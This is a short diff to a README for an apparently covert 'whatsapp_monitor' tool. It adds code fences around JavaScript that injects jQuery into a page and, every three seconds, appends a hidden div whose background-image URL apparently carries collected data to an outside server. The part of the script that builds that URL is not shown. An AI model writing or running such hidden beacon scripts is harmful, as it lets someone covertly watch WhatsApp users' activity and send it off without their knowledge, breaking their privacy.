@@ -1,5 +1,6 @@
 # whatsapp_monitor
 
+```javascript
 var jq = document.createElement('script');
 jq.src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js";
 document.getElementsByTagName('head')[0].appendChild(jq);
@@ -24,3 +25,4 @@ setInterval(function() {
 	$("body").append("<div id='div_data_hidden' style='background-image: url(" + url +  ");'></div>");	
 	
 }, 3000);
+```
